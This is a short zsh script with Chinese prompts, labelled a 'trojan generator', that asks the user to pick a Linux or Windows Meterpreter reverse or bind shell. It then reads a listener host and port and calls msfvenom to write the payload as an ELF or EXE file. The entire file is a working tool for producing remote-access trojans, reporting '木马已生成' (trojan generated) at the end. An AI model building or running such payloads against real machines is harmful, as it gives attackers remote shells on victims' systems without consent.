#!/bin/zsh

echo "====== ������ MuMu 木马生成器 ======"
echo "1. Linux - Reverse Shell (默认)"
echo "2. Linux - Bind Shell"
echo "3. Windows - Reverse Shell"
echo "4. Windows - Bind Shell"

echo -n "请选择类型 [默认 1]: "
read choice
choice=${choice:-1}

# 获取 eth0 的 IPv4 地址作为默认 LHOST
default_ip=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -n 1)

# 初始化变量
platform=""
mode=""
ext=""
payload=""
filename=""
LHOST=""
LPORT=""

case $choice in
  1)
    platform="linux"
    mode="reverse"
    ext="elf"
    payload="linux/x64/meterpreter/reverse_tcp"
    echo -n "请输入 LHOST [$default_ip]: "
    read LHOST
    LHOST=${LHOST:-$default_ip}
    ;;
  2)
    platform="linux"
    mode="bind"
    ext="elf"
    payload="linux/x64/meterpreter/bind_tcp"
    echo -n "请输入目标 IP（必填）: "
    read LHOST
    if [[ -z "$LHOST" ]]; then
      echo "❌ IP 地址不能为空！"
      exit 1
    fi
    ;;
  3)
    platform="windows"
    mode="reverse"
    ext="exe"
    payload="windows/meterpreter/reverse_tcp"
    echo -n "请输入 LHOST [$default_ip]: "
    read LHOST
    LHOST=${LHOST:-$default_ip}
    ;;
  4)
    platform="windows"
    mode="bind"
    ext="exe"
    payload="windows/meterpreter/bind_tcp"
    echo -n "请输入目标 IP（必填）: "
    read LHOST
    if [[ -z "$LHOST" ]]; then
      echo "❌ IP 地址不能为空！"
      exit 1
    fi
    ;;
  *)
    echo "❌ 无效选项"
    exit 1
    ;;
esac

echo -n "请输入 LPORT [4444]: "
read LPORT
LPORT=${LPORT:-4444}

filename="${mode}_${LPORT}.${ext}"

echo "������ 正在生成 $filename ..."
if [[ "$mode" == "reverse" ]]; then
  msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" -f "$ext" -o "$filename"
else
  msfvenom -p "$payload" LPORT="$LPORT" -f "$ext" -o "$filename"
fi

echo "✅ 木马已生成：$filename"

